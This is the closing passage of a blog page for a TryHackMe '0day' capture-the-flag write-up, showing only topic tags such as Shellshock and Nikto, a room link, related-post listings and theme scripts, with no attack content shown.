</span></pre></table></code></div></div><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/mandatory/pwned.png" alt="" /></p><blockquote><p><a href="https://tryhackme.com/room/0day">0day - Tryhackme</a></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='//categories/tryhackme/'>Tryhackme</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="//tags/cgi/" class="post-tag no-text-decoration" >CGI</a> <a href="//tags/curl/" class="post-tag no-text-decoration" >Curl</a> <a href="//tags/nikto/" class="post-tag no-text-decoration" >Nikto</a> <a href="//tags/overlay/" class="post-tag no-text-decoration" >Overlay</a> <a href="//tags/shellshock/" class="post-tag no-text-decoration" >Shellshock</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="/knowledge-should-be-free">do wtf you want with it.</a></div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Tryhackme - 0day - Rhovelionz&url=http://localhost:4000/posts/0day/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Tryhackme - 0day - Rhovelionz&u=http://localhost:4000/posts/0day/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Tryhackme - 0day - Rhovelionz&url=http://localhost:4000/posts/0day/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/0day/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Relevant/">Tryhackme - Relevant</a></li><li><a href="/posts/Tartarus/">Tryhackme - Tartarus</a></li><li><a href="/posts/Traceback/">Hackthebox - Traceback</a></li><li><a href="/posts/Tabby/">Hackthebox - Tabby</a></li><li><a href="/posts/Sauna/">Hackthebox - Sauna</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>More stuffs below ↓</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Overpass/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 24, 2020 <i class="unloaded">2020-08-24T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Overpass</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Tartarus/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 8, 2020 <i class="unloaded">2020-09-08T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Tartarus</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div><div class="card"> <a href="/posts/Relevant/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 25 <i class="unloaded">2022-09-25T07:21:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Relevant</h3><div class="text-muted small"><p> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <!--<footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/122977"></script></div><div class="footer-middle"> <script src="https://tryhackme.com/badge/1378608"></script></div>--> <!--<div class="footer-right"><p class="mb-0"> Powered by <a href="https://draculatheme.com/" target="">Rhovelionz - Dracula themes</a></p></div></div>div.d-flex</footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '//assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
